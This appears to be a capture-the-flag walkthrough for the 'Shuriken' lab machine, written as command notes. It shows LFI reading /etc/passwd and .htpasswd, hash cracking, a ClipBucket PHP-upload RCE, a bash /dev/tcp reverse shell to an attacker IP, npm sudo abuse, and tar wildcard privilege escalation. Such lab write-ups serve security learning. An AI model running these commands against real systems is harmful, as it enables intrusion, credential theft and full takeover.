Skills:

- Web Enumeration
- JS Code Inspection
- Information Leakage
- Local File Inclusion (LFI + Base64 Wrapper)
- Virtual Hosting
- Subdomain Enumeration
- Abusing LFI - Reading Apache config files
- Cracking Hashes
- ClipBucket v4.0 Exploitation - Malicious PHP File Upload
- Abusing sudoers privilege (npm) [User Migration]
- Process Monitoring - PSPY
- Abusing Cron Job - Analyzing Bash script
- Abusing Wildcards (tar command) [Privilege Escalation]


Only port 80 is open, checking the website we found a login panel

```bash
http://192.168.0.103/login.html
```

WE found two .js files

```bash
http://192.168.0.103/js
#use beatifier.io to view the js code
https://beautifier.io
```

We found a domain name, so I save it in my hosts file ( broadcast.shuriken.local - shuriken.local)
Checking the broadcast.shuriken.local , the site is asking for sign in.
In one of the js files we found a URL with a parameter "referer=" , what makes me think in a Local File INclusion vulnerability
```bash
>curl -s http://shuriken.local/index.php?referer=/etc/passwd
# server apache, search for config files
>curl -s http://shuriken.local/index.php?referer=/etc/apache2/sites-enabled/000-default.conf
>curl -s http://shuriken.local/index.php?referer=/etc/apache2/.htpasswd --> found credentials
#crack the hash
>john --wordlist=rockyou hash
```

With these credentials we can acces to the broadcast.shuriken.local site
It's a clipbucket application --> video hosting
Use searchsploit to find vulnerabilities

```bash
>searchsploit clipbucket --> Command injection, file upload, sql injection
#remote code execution abusing the file upload
>curl -F "file=@cmd.php" -F "plupload=1" -F "name=cmd.php" http://developers:9972761drmfsls@broadcast.shuriken.local/actions/photo_uploader.php
#find the upload directory using gobuster
>gobuster dir -u http://developers:9972761drmfsls@broadcast.shuriken.local/ -w /usr/share/seclist
>http://broadcast.shuriken.local/files/photos....php?cmd=whoami  --> remote command execution
#gain a reverse shell
>nc -nlvp 1234
>http://broadcast.shuriken.local/files/photos....php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.100/1234 0>%261"
```

In this way we gain access to the system, no we need to escalate privileges
```bash
>sudo -l --> we can execute as the server-management user the npm binary --> user migration
>gtfobins npm --> chmod 777 -R /tmp/tmp.pr2
# Now as the server-management
>find /-perm -4000 2>/dev/null --> nothing
#use pspy to find a task that execute something in time intervals | curl http:/192.168.0.100/pspy -o pspy
>./pspy --> the user root execute a bash script
>cat /var/opt/backupsrv.sh --> It's a backup script, we can abuse this. Abusing Wildcards (tar command) 
>touch -- --checkpoint=1
>touch -- --checkpoint-action=exec='sh command'
>touch command
>chmod +x command
>nano command --> #!/bin/bash chmod u+s /bin/bash
>bash -p
```







